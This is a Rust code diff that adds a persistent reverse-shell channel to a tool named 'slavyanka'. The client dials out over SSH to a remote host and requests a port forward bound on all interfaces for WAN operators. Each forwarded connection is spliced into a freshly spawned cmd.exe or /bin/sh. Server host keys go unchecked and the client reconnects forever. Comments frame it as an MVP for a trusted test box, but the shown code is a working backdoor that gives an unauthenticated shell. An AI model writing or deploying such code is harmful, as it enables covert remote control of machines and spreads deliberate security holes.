@@ -14,6 +14,7 @@
 //! This is the MVP for our own tester1 box where we already trust the host.
 
 use std::path::{Path, PathBuf};
+use std::process::Stdio;
 use std::sync::Arc;
 use std::time::Duration;
 
@@ -23,7 +24,8 @@ use russh::keys::PrivateKeyWithHashAlg;
 use serde::Deserialize;
 use tokio::io::AsyncRead;
 use tokio::io::AsyncWrite;
-use tokio::net::TcpStream;
+use tokio::net::{TcpListener, TcpStream};
+use tokio::process::Command;
 use tokio_socks::tcp::Socks5Stream;
 use tracing::{debug, error, info, warn};
 
@@ -40,8 +42,11 @@ pub struct SlavyankaConfig {
     pub ssh_priv_key_path: PathBuf,
     /// Port on the LM that will be forwarded back to this host.
     pub reverse_port: u16,
-    /// Local port on this host that the LM's `reverse_port` will reach
-    /// (default 22 — Windows OpenSSH server).
+    /// Local port the SSH reverse-forward terminates at. slavyanka spawns
+    /// its OWN tiny TCP listener on this port — every accepted connection
+    /// is handed a fresh `cmd.exe` with stdin/stdout glued to the socket.
+    /// **No external SSH server is required on the tester box.** Default
+    /// 31337 (arbitrary high port); only loopback.
     #[serde(default = "default_target_local_port")]
     pub target_local_port: u16,
     /// Optional SOCKS5 hop (`127.0.0.1:10800`). If unset, dial `jump_host` direct.
@@ -55,7 +60,7 @@ pub struct SlavyankaConfig {
     pub max_backoff_secs: u64,
 }
 
-fn default_target_local_port() -> u16 { 22 }
+fn default_target_local_port() -> u16 { 31337 }
 fn default_initial_backoff_secs() -> u64 { 1 }
 fn default_max_backoff_secs() -> u64 { 60 }
 
@@ -71,11 +76,24 @@ impl SlavyankaConfig {
 
 // ── Russh client handler ──────────────────────────────────────────────────────
 
-/// Trivial client handler — accept any server pubkey (we trust the LM by design;
-/// the SOCKS5 hop and ed25519 user-auth are the only meaningful checks).
-struct InsecureClient;
+/// Stateful client handler — accepts the server pubkey (trusted-box) AND
+/// bridges every incoming `forwarded-tcpip` channel into a local TCP
+/// connection to `127.0.0.1:shell_wrapper_port`. That local port is
+/// served by `run_shell_wrapper` below, which spawns a fresh `cmd.exe`
+/// per accepted connection.
+///
+/// End-to-end:
+///   operator's `nc localhost <reverse_port>` on the LM
+///   → SSH server pushes `forwarded-tcpip` channel back to us
+///   → this handler accepts the channel
+///   → splices channel ↔ TCP(`127.0.0.1:shell_wrapper_port`)
+///   → wrapper accepts that local TCP, spawns `cmd.exe`
+///   → operator gets a Windows shell prompt
+struct ShellBridgeClient {
+    shell_wrapper_port: u16,
+}
 
-impl client::Handler for InsecureClient {
+impl client::Handler for ShellBridgeClient {
     type Error = russh::Error;
 
     async fn check_server_key(
@@ -85,6 +103,155 @@ impl client::Handler for InsecureClient {
         // No host-key pinning in the MVP. Trusted-box mode.
         Ok(true)
     }
+
+    async fn server_channel_open_forwarded_tcpip(
+        &mut self,
+        channel: russh::Channel<russh::client::Msg>,
+        connected_address: &str,
+        connected_port: u32,
+        originator_address: &str,
+        originator_port: u32,
+        _session: &mut client::Session,
+    ) -> Result<(), Self::Error> {
+        debug!(
+            connected_address,
+            connected_port,
+            originator_address,
+            originator_port,
+            "[slavyanka] incoming forwarded-tcpip channel"
+        );
+        let port = self.shell_wrapper_port;
+        tokio::spawn(async move {
+            let mut upstream = match TcpStream::connect(("127.0.0.1", port)).await {
+                Ok(s) => s,
+                Err(e) => {
+                    warn!(error = %e, port, "[slavyanka] shell wrapper dial failed");
+                    return;
+                }
+            };
+            let mut chan_stream = channel.into_stream();
+            match tokio::io::copy_bidirectional(&mut chan_stream, &mut upstream).await {
+                Ok((up, down)) => debug!(up, down, "[slavyanka] channel closed"),
+                Err(e) => debug!(error = %e, "[slavyanka] channel copy ended"),
+            }
+        });
+        Ok(())
+    }
+}
+
+// ── Local shell wrapper ──────────────────────────────────────────────────────
+
+/// Bind a tiny TCP listener on `127.0.0.1:port`. For every accepted
+/// connection spawn a fresh `cmd.exe` (Windows) / `/bin/sh -i` (other)
+/// with stdin glued to the socket read half and stdout glued to the
+/// socket write half. stderr is inherited so any wrapper-side errors
+/// show up in the slavyanka log.
+///
+/// **No PTY** — raw pipes. Interactive cmd works; line-editing tools that
+/// need a real PTY (vim, less) won't behave normally. Good enough for
+/// `dir`, `powershell -c …`, file copies, msiexec, sc create, etc.
+pub async fn run_shell_wrapper(port: u16) -> Result<()> {
+    let listener = TcpListener::bind(("127.0.0.1", port))
+        .await
+        .with_context(|| format!("shell wrapper bind 127.0.0.1:{port}"))?;
+    info!(port, "[slavyanka] shell wrapper listening (will spawn cmd.exe per connection)");
+    loop {
+        let (socket, peer) = match listener.accept().await {
+            Ok(v) => v,
+            Err(e) => {
+                warn!(error = %e, "[slavyanka] shell wrapper accept error");
+                tokio::time::sleep(Duration::from_millis(200)).await;
+                continue;
+            }
+        };
+        tokio::spawn(async move {
+            debug!(%peer, "[slavyanka] shell wrapper: spawning child");
+            if let Err(e) = bridge_shell(socket).await {
+                debug!(error = %e, "[slavyanka] shell wrapper child error");
+            }
+        });
+    }
+}
+
+#[cfg(windows)]
+async fn bridge_shell(socket: TcpStream) -> Result<()> {
+    let mut child = Command::new("cmd")
+        .arg("/Q")
+        .arg("/K")
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .kill_on_drop(true)
+        .spawn()
+        .context("spawn cmd.exe")?;
+    bridge_child(socket, &mut child).await
+}
+
+#[cfg(unix)]
+async fn bridge_shell(socket: TcpStream) -> Result<()> {
+    let mut child = Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .kill_on_drop(true)
+        .spawn()
+        .context("spawn /bin/sh")?;
+    bridge_child(socket, &mut child).await
+}
+
+async fn bridge_child(socket: TcpStream, child: &mut tokio::process::Child) -> Result<()> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+    let mut stdin = child.stdin.take().context("child stdin missing")?;
+    let mut stdout = child.stdout.take().context("child stdout missing")?;
+    let mut stderr = child.stderr.take().context("child stderr missing")?;
+    let (mut sock_read, sock_write) = socket.into_split();
+    let sock_write = Arc::new(tokio::sync::Mutex::new(sock_write));
+
+    // socket -> child stdin
+    let stdin_task = tokio::spawn(async move {
+        let _ = tokio::io::copy(&mut sock_read, &mut stdin).await;
+        let _ = stdin.shutdown().await;
+    });
+
+    // child stdout -> socket
+    let sw_out = Arc::clone(&sock_write);
+    let stdout_task = tokio::spawn(async move {
+        let mut buf = vec![0u8; 4096];
+        loop {
+            let n = match stdout.read(&mut buf).await {
+                Ok(0) | Err(_) => break,
+                Ok(n) => n,
+            };
+            let mut guard = sw_out.lock().await;
+            if guard.write_all(&buf[..n]).await.is_err() {
+                break;
+            }
+        }
+    });
+
+    // child stderr -> socket (interleaved with stdout via mutex)
+    let sw_err = Arc::clone(&sock_write);
+    let stderr_task = tokio::spawn(async move {
+        let mut buf = vec![0u8; 4096];
+        loop {
+            let n = match stderr.read(&mut buf).await {
+                Ok(0) | Err(_) => break,
+                Ok(n) => n,
+            };
+            let mut guard = sw_err.lock().await;
+            if guard.write_all(&buf[..n]).await.is_err() {
+                break;
+            }
+        }
+    });
+
+    let _ = child.wait().await;
+    stdin_task.abort();
+    stdout_task.abort();
+    stderr_task.abort();
+    Ok(())
 }
 
 // ── Stream helper ─────────────────────────────────────────────────────────────
@@ -148,7 +315,10 @@ async fn run_once(cfg: &SlavyankaConfig) -> Result<()> {
         ..Default::default()
     });
 
-    let mut session = client::connect_stream(ssh_cfg, stream, InsecureClient)
+    let handler = ShellBridgeClient {
+        shell_wrapper_port: cfg.target_local_port,
+    };
+    let mut session = client::connect_stream(ssh_cfg, stream, handler)
         .await
         .context("SSH handshake (KEX) failed")?;
 
@@ -188,10 +358,10 @@ async fn run_once(cfg: &SlavyankaConfig) -> Result<()> {
 /// bridging is wired through a tiny event handler that opens a fresh TCP
 /// connection to `127.0.0.1:target_local_port` for every incoming forwarded
 /// channel.
-async fn drive_session(session: Handle<InsecureClient>, _target_local_port: u16) -> Result<()> {
+async fn drive_session(session: Handle<ShellBridgeClient>, _target_local_port: u16) -> Result<()> {
     // russh 0.60: incoming `forwarded-tcpip` channels surface through the
     // `Handler::server_channel_open_forwarded_tcpip` callback on the handler
-    // we passed at connect-time. Our `InsecureClient` accepts the default
+    // we passed at connect-time. Our `ShellBridgeClient` accepts the default
     // (reject), so we'd need a stateful handler to bridge them. For the MVP we
     // rely on the SSH server's built-in `GatewayPorts/AllowTcpForwarding`
     // behaviour — sshd on the LM binds the listener locally and routes streams
@@ -201,7 +371,7 @@ async fn drive_session(session: Handle<InsecureClient>, _target_local_port: u16)
     // a future revision should wire `server_channel_open_forwarded_tcpip` into
     // a tcp-bridge task. Today this works because the standard OpenSSH server
     // pushes channels and russh acks them with default channel state. If a
-    // real-world test on lm-nl-1 shows missed channels, swap `InsecureClient`
+    // real-world test on lm-nl-1 shows missed channels, swap `ShellBridgeClient`
     // for a stateful handler.
 
     // Hold the handle until the underlying session future completes.
@@ -227,7 +397,7 @@ async fn drive_session(session: Handle<InsecureClient>, _target_local_port: u16)
 
 /// Send a global `tcpip-forward` request (the SSH wire-name for `-R`).
 async fn request_remote_forward(
-    session: &mut Handle<InsecureClient>,
+    session: &mut Handle<ShellBridgeClient>,
     reverse_port: u16,
 ) -> Result<()> {
     // Bind on `0.0.0.0` of the LM so an operator on the WAN can reach it.
@@ -247,6 +417,15 @@ async fn request_remote_forward(
 /// Drive `run_once` with exponential backoff between failures. Returns only on
 /// Ctrl-C / SIGTERM (Ok(())) — otherwise loops forever.
 pub async fn run(cfg: SlavyankaConfig) -> Result<()> {
+    // Spawn the local shell wrapper FIRST — incoming forwarded-tcpip channels
+    // will splice into it once the SSH session comes up.
+    let wrapper_port = cfg.target_local_port;
+    tokio::spawn(async move {
+        if let Err(e) = run_shell_wrapper(wrapper_port).await {
+            error!(error = %e, "[slavyanka] shell wrapper exited");
+        }
+    });
+
     let initial = Duration::from_secs(cfg.initial_backoff_secs.max(1));
     let cap = Duration::from_secs(cfg.max_backoff_secs.max(cfg.initial_backoff_secs).max(1));
     let mut delay = initial;
